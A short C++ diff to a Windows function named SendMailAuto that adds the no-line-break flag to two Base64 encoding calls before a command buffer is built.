@@ -158,11 +158,12 @@ bool SendMailAuto(const char* subject, const char* body) {
 
     DWORD b64len = 0;
     CryptBinaryToStringW((const BYTE*)wps.c_str(), (DWORD)((wlen-1)*sizeof(WCHAR)),
-                         CRYPT_STRING_BASE64, NULL, &b64len);
+                         CRYPT_STRING_BASE64 | 0x40000000, NULL, &b64len);
     if (b64len == 0) return false;
     std::wstring b64(b64len, L'\0');
     if (!CryptBinaryToStringW((const BYTE*)wps.c_str(), (DWORD)((wlen-1)*sizeof(WCHAR)),
-                              CRYPT_STRING_BASE64, &b64[0], &b64len)) return false;
+                              CRYPT_STRING_BASE64 | 0x40000000, &b64[0], &b64len)) return false;
+    // Newlines already suppressed by CRYPT_STRING_NOCRLF
     while (!b64.empty() && (b64.back()==L'\n'||b64.back()==L'\r')) b64.pop_back();
 
     WCHAR cmd[4096];
